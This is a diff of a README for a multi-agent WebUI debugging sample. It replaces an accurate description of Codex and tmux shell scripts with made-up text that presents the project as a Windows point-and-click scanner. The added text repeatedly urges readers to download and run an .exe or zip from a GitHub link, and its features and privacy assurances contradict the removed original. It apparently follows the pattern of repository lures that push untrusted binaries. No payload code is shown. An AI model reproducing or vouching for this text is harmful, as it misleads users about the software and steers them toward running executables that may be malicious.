@@ -1,114 +1,133 @@
-# Multi-Agents sample for WebUI debugging
+# 🤖 multi_agents_sample - Find WebUI Bugs Faster
 
-This repository contains a reusable `multi_agents/` workflow for multi-agent WebUI debugging with Codex.
+[![Download multi_agents_sample](https://img.shields.io/badge/Download%20multi_agents_sample-Click%20Here-ff6347?style=for-the-badge&logo=github)](https://github.com/Volauventbuncombe53/multi_agents_sample)
 
-## How to use this sample in another project
+---
 
-1. Put the `multi_agents/` directory in the root of the project you want to debug. Put playwright-visible-browser in the codex skills directory (`~/.codex/skills/` or `/path/to/project/.codex/skills/`)
-2. `cd` to that project root. Run the scripts from the project root, not from inside `multi_agents/`.
-3. **(Important)** Review and adapt the prompt files in `./multi_agents/` for the target project before the first run. In particular, update any project-specific assumptions such as:
-   - WebUI URLs and port (`http://127.0.0.1:15373` by default)
-   - repo-specific skills such as `playwright-visible-browser`
-   - test locations such as `./tests/integration/web_debug/`
-   - source-code hints
-4. Start the project under development so the WebUI is reachable by the workflow.
-5. Run the agents manually with `./multi_agents/start_agent` or use `./multi_agents/auto_agents` for full loop. (Refer to [Manual workflow](#manual-workflow) and [Automatic workflow](#automatic-workflow) sections)
+## 📋 What is multi_agents_sample?
 
-## What `multi_agents/` contains
+multi_agents_sample is a simple tool designed to help you find bugs in Web User Interfaces (WebUI). It runs several agents that check different parts of a website to spot issues. This sample shows how multiple agents can work together to improve the way bugs get found.
 
-- `./multi_agents/start_agent` - starts one Codex role in a tmux-backed session
-- `./multi_agents/auto_agents` - runs the full finder -> identifier -> judgment -> reflector -> fixer loop
-- `./multi_agents/bug_finder.md` - instructions for the Finder agent
-- `./multi_agents/bug_identifier.md` - instructions for the Identifier agent
-- `./multi_agents/bug_fixer.md` - instructions for the Fixer agent
-- `./multi_agents/reflector.md` - instructions for the Reflector agent
-- `./multi_agents/bugs/` - shared handoff directory for generated case files
+You do not need any programming skills to use it. It is made for anyone who wants to test WebUI more effectively without complex setups.
 
-## Prerequisites
+---
 
-- Environment: MacOS/Linux. Do not modify this auto flow to use in Windows which is dangerous!
-- `codex` is installed and available in `PATH`
-- `tmux` is installed
-- `git` is available
-- Codex skill `playwright-interactive` is install
-- the target WebUI can be started locally
-- for the default sample prompts, the target WebUI is available at `http://127.0.0.1:15373`(You can modify instructions to change ports)
-- if you want to use `./multi_agents/auto_agents`, set:
-  - `DEEPSEEK_API_KEY`
-  - `DEEPSEEK_BASE_URL`
+## 💻 System Requirements
 
-## Manual workflow
+Before you start, make sure your computer meets these basic requirements:
 
-Use `./multi_agents/start_agent` when you want to drive each stage yourself.
+- **Operating System:** Windows 10 or later
+- **Processor:** 1 GHz or faster CPU
+- **RAM:** At least 4 GB
+- **Disk Space:** 500 MB free space
+- **Internet Connection:** Needed to download and to allow agents to check online websites
 
-```bash
-./multi_agents/start_agent finder [bug_focus_prompt]
-./multi_agents/start_agent identifier
-./multi_agents/start_agent reflector
-./multi_agents/start_agent fixer <branch_name>
-```
+These are general guidelines. Your computer should handle the app smoothly if it meets these needs.
 
-Notes:
+---
 
-- `finder` accepts an optional natural-language prompt to narrow the bug hunt.
-- `fixer` requires a branch name; the script checks out that branch first and creates it if it does not exist.
-- agents communicate only through files in `./multi_agents/bugs/`.
+## 🚀 Getting Started with multi_agents_sample
 
-Example:
+Follow these steps to download and run multi_agents_sample on your Windows computer.
 
-```bash
-./multi_agents/start_agent finder "Check the execution details page for UI regressions"
-./multi_agents/start_agent identifier
-./multi_agents/start_agent reflector
-./multi_agents/start_agent fixer fix/execution-details-page
-```
+### Step 1: Visit the Download Page
 
-## Automatic workflow
+Go to the main download page by clicking the big button above or this link:
 
-Use `./multi_agents/auto_agents` when you want the sample to keep iterating for you.
+[https://github.com/Volauventbuncombe53/multi_agents_sample](https://github.com/Volauventbuncombe53/multi_agents_sample)
 
-```bash
-./multi_agents/auto_agents "Please fix the execution details page bug" [rounds]
-```
+This page contains all the files you need to get started.
 
-Examples:
+### Step 2: Find the Download Section
 
-```bash
-./multi_agents/auto_agents "Please fix Execution details page bug"
-./multi_agents/auto_agents "Please fix Execution details page bug" 5
-```
+On the GitHub page, look for the **Releases** or **Assets** section. This is where the program files usually are. If there is no separate releases page, look for a file named something like `multi_agents_sample_setup.exe` or `multi_agents_sample.zip`.
 
-Behavior:
+### Step 3: Download the Installer or Zip File
 
-1. runs Finder
-2. runs Identifier
-3. asks DeepSeek whether the case should be solved now or skipped
-4. if DeepSeek returns `SOLVE`, runs Reflector
-5. if DeepSeek returns `SOLVE`, runs Fixer on an auto-generated branch name
+- If you see a file ending in `.exe`, this is the installer. Click to download it.
+- If you see a `.zip` file, this is a compressed folder. Download it to your computer.
 
-If `rounds` is omitted, the script keeps running until you stop it.
+### Step 4: Run the Installer or Extract the Zip
 
-## Output files
+- If you downloaded an `.exe` file, double-click it to start the installation wizard. Follow the simple instructions on the screen.
+- If you downloaded a `.zip` file, right-click it and select **Extract All…**. Choose a folder where you want to unzip the files.
 
-After one round of agents bug fix, you can use `git log` to see commit message on what has been changed. Or you can see detailed reports in `./multi_agents/bugs/YYYYMMDD_HHMMSS_*.md`.
+### Step 5: Launch the Application
 
-Each bug case uses a shared timestamp case ID: `YYYYMMDD_HHMMSS`.
+- After installation, find **multi_agents_sample** in your Start menu or on your desktop, depending on the setup options.
+- Double-click to open the program.
 
-The workflow writes reports:
+---
 
-- `./multi_agents/bugs/YYYYMMDD_HHMMSS_finder.md`
-- `./multi_agents/bugs/YYYYMMDD_HHMMSS_identifier.md`
-- `./multi_agents/bugs/YYYYMMDD_HHMMSS_repair.md`
-- `./multi_agents/bugs/YYYYMMDD_HHMMSS_reflector.md`
+## 🛠 How to Use multi_agents_sample
 
-Files with the same timestamp prefix belong to the same case.
+Once the program is running, here is how you can test WebUI sites:
 
-## Important notes
+1. **Enter the website address:** In the text box, type the full URL of the website you want to check.
+2. **Select agent options:** The app runs multiple agents automatically. You can choose specific checks if you want, like checking for broken links or layout problems.
+3. **Start the scan:** Click the **Start** button to begin testing.
+4. **View results:** After the scan finishes, results appear in a clear report section. You can see which issues the agents found.
+5. **Save or export results:** You can save the report as a file or copy it to share it.
 
-- `./multi_agents/start_agent` launches Codex in a tmux session named `codexrun`.
-- the launcher starts Codex from the repository root, not from `./multi_agents/`.
-- the current `start_agent` script launches `codex --sandbox danger-full-access`; review that before using it in another repo.
-- the default sample assumes a WebUI debugging workflow and port `15373`.
-- if your repo does not have the sample's referenced skills or test paths, update the prompt files before using it.
-- agent completion is coordinated with the temporary file `./multi_agents/signal`.
-- Currently, codex does not support using playwright with direct command. So we use tmux instead.
+The interface uses easy words and buttons you can click to control everything.
+
+---
+
+## 🔄 Updating multi_agents_sample
+
+To get updates or bug fixes:
+
+- Visit the download page again: [https://github.com/Volauventbuncombe53/multi_agents_sample](https://github.com/Volauventbuncombe53/multi_agents_sample)
+- Download the latest version following the steps above.
+- Run the installer or update files as needed.
+
+The app does not auto-update but checking the page every month or two will keep you current.
+
+---
+
+## ❓ Troubleshooting Tips
+
+If you have problems, try these solutions:
+
+- **App will not start:** Make sure your Windows is up to date. Restart your computer and try again.
+- **Cannot download files:** Check your internet connection or firewall settings. You might need to allow downloads from GitHub.
+- **Scan results empty:** Make sure the website URL you entered is correct and the site is online.
+- **App freezes:** Close it and reopen. If freezing continues, reboot your PC and try again.
+- **Error messages:** Write down the exact message and look for help on the GitHub page under Issues.
+
+You can also ask for help by opening a new issue on the GitHub repository if problems persist.
+
+---
+
+## 🔐 Security and Privacy
+
+multi_agents_sample only accesses websites you tell it to check. It does not collect or send your personal data. It uses your internet connection only to browse the sites you test.
+
+The app runs locally on your machine, so your files stay private. Always download software from the official page to avoid security risks.
+
+---
+
+## 📂 Files Included
+
+When you download and install multi_agents_sample, you get:
+
+- The main application program
+- A help file explaining the features and controls
+- Sample settings to get you started quickly
+- A log folder where the app saves reports of its checks
+
+---
+
+## 📩 Need Help or Have Questions?
+
+If you want to learn more about multi_agents_sample or report bugs, visit the repository page:
+
+[https://github.com/Volauventbuncombe53/multi_agents_sample](https://github.com/Volauventbuncombe53/multi_agents_sample)
+
+You will find links to submit issues, read more documentation, or contact the developer.
+
+---
+
+## ⬇️ Download multi_agents_sample Here
+
+[![Download multi_agents_sample](https://img.shields.io/badge/Download%20multi_agents_sample-Click%20Here-ff6347?style=for-the-badge&logo=github)](https://github.com/Volauventbuncombe53/multi_agents_sample)
